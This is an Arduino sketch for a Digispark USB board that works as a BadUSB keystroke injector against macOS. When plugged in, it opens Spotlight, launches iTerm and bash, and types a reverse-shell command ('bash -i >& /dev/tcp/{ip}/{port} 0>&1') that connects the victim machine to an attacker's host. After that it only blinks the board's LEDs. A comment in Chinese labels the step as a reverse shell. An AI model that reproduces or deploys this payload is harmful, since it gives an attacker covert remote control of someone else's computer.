#include "DigiKeyboard.h"

void setup()
{
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // command + space 调出 spotlight
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);

  DigiKeyboard.print("iterm");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  DigiKeyboard.print("bash");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // 反弹shell
  DigiKeyboard.print("bash -i >& /dev/tcp/{ip}/{port} 0>&1");
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // initialize the digital pin as an output.
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop()
{
  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
  delay(500);               // wait for a second
  digitalWrite(0, LOW);    // turn the LED off by making the voltage LOW
  digitalWrite(1, LOW); 
  delay(500);               // wait for a second
}
